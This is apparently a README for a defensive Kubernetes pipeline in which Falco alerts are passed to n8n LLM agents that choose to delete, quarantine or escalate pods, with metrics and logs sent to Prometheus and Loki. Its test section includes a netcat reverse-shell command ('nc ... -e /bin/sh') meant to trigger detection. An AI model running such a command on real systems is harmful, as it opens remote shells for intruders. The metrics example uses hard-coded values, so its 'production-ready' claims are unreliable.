# AI-Driven Kubernetes Runtime Security System  
### *Falco + n8n AI Agents + ROSES + RACE + Prometheus + Loki + Grafana*

This project implements a fully automated, **AI-augmented security and response pipeline** for Kubernetes.  
It detects threats using **Falco**, analyzes events using **LLM-based ROSES & RACE agents**, performs autonomous remediation actions, and exports **SRE-grade metrics** into Prometheus while streaming logs into Loki for full observability.

---

# 📌 Architecture Overview
```pgsql
Falco → Falcosidekick → n8n Webhook
↓
┌────────────────────────────────────────────┐
│ n8n AI Pipeline │
│--------------------------------------------│
│ ROSES → JSON Parser → RACE → JSON Parser │
│ → Decision Switch → K8s API Actions │
│ → Pushgateway (Prometheus Metrics) │
│ → Loki (Log Storage) │
└────────────────────────────────────────────┘
↓
Grafana Dashboards
```pgsql

---

# 🚀 Quick Start

## 1. Deploy the entire system

```bash
./deploy.sh
```

This script installs:
- KIND Kubernetes cluster
- Falco + Falcosidekick UI
- n8n with NodePort
- RBAC + ServiceAccount token
- Loki + Promtail + Grafana
- Prometheus + Pushgateway
- Quarantine NetworkPolicy
- Playground test pods

# 🌐 Access URLs

After installation:
```nginx
Falco UI:         http://localhost:32040
n8n UI:           http://localhost:30008
Grafana:          http://localhost:30300
Prometheus:       http://localhost:30900
Pushgateway:      http://localhost:30123
```

The script prints the n8n Kubernetes API token automatically.

# 
## 1. Webhook (Falco → n8n)
Receives JSON Falco alert.

## 2. ROSES AI Agent

- Analyzes event using ROSES framework:
- ROLE
- OBJECTIVE
- STEPS
- EVIDENCE
- SUMMARY

## 3. ROSES JSON Parser

Extracts valid JSON using regex:
```javascript
const raw = $input.first().json.output;
const jsonMatch = raw.match(/\{(?:[^{}]|(?:\{[^{}]*\}))*\}/);
return [{ json: JSON.parse(jsonMatch[0]) }];
```

## 4. RACE AI Agent

Makes final decision:
- delete_pod
- quarantine_pod
- ignore
- escalate

## 5. RACE Parser (same logic as ROSES parser)
## 6. Build Prometheus Metrics
```javascript
return [{
  json: {
    mtta: 4.2,
    mttr: 4.2,
    classification: "true_positive",
    decision: "delete_pod"
  }
}];
```

## 7. Pushgateway HTTP Request
```bash
POST /metrics/job/incident-pipeline
Content-Type: text/plain

incident_pipeline_mtta_seconds 4.2
incident_pipeline_mttr_seconds 4.2
incident_pipeline_incident_total{classification="true_positive"} 1
incident_pipeline_decision_total{decision="delete_pod"} 1
incident_pipeline_events_total 1
```

## 8. Switch Node → Kubernetes API

Decision logic:
```pgsql
delete_pod → kubectl delete pod
quarantine_pod → patch label + apply NetworkPolicy
escalate → external webhook / Slack
ignore → do nothing
```
# 🧪 Test Playground Pods

The script deploys:
```bash
kubectl apply -f manifests/playground/pod-delete.yaml
kubectl apply -f manifests/playground/pod-quarantine.yaml
kubectl apply -f manifests/playground/escalate-test.yaml
kubectl apply -f manifests/playground/test-shell.yaml
```

Trigger Falco by running commands inside the pod, e.g.:
```bash
kubectl exec -n playground -it pod-delete-test -- nc 1.1.1.1 4444 -e /bin/sh
```

# 🔒 Quarantine Mode
Patch pod:
```bash
kubectl patch pod pod-quarantine-test \
  -n playground \
  -p '{"metadata":{"labels":{"security/quarantined":"true"}}}'
```

Auto-isolation NetworkPolicy:
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantine
spec:
  podSelector:
    matchLabels:
      security/quarantined: "true"
  ingress: []
  egress: []
  policyTypes:
  - Ingress
  - Egress
```

# 📊 Prometheus Metrics
## MTTA
Mean Time To Acknowledge:
```promql
avg_over_time(incident_pipeline_mtta_seconds[24h])
```

## MTTR
Mean Time To Respond:
```promql
avg_over_time(incident_pipeline_mttr_seconds[24h])
```

## False Positive Rate
```promql
sum(incident_pipeline_incident_total{classification="false_positive"})
/
sum(incident_pipeline_incident_total)
```

## Decision Distribution
```promql
sum by(decision) (incident_pipeline_decision_total)
```

# 📝 Loki Log Storage

n8n pushes structured logs:
```json
{
  "decision": "delete_pod",
  "classification": "true_positive",
  "pod": "pod-delete-test",
  "timestamp": "2025-12-11T06:33:14Z"
}
```

Query in Grafana Explore:
```logql
{job="incident-pipeline"}
```

# 📈 Grafana Dashboards

Recommended panels:

## MTTA Trend
```promql
incident_pipeline_mtta_seconds
```

## MTTR Trend
```promql
incident_pipeline_mttr_seconds
```

## Decision Distribution (Pie Chart)
```promql
sum(incident_pipeline_decision_total) by (decision)
```

## Classification Heatmap
```promql
sum(incident_pipeline_incident_total) by (classification)
```

## Loki Logs Table
```logql
{job="incident-pipeline"}
```

# 📂 Repository Structure
```pgsql
├── cluster/
│   └── kind-config.yaml
├── deploy.sh
├── manifests/
│   ├── falco/
│   ├── n8n/
│   ├── monitoring/
│   ├── playground/
│   ├── policy/
│   └── token/
└── README.md
```

# 🛡 Security Notes

- All actions use a restricted ServiceAccount
- Only pod delete / patch allowed
- All decisions logged
- All metrics exported
- Full traceability available through Loki

# 🎯 Conclusion

This project demonstrates a production-grade AI-driven Kubernetes security pipeline:
✔ Real-time detection (Falco)
✔ AI reasoning (ROSES)
✔ AI classification (RACE)
✔ Autonomous remediation (n8n + K8s API)
✔ MTTA/MTTR/FPR observability (Prometheus)
✔ Full audit logs (Loki)
✔ Dashboards (Grafana)

It is a complete, research-ready and production-ready system for AI-Powered SecOps / AIOps / Cloud Security Automation.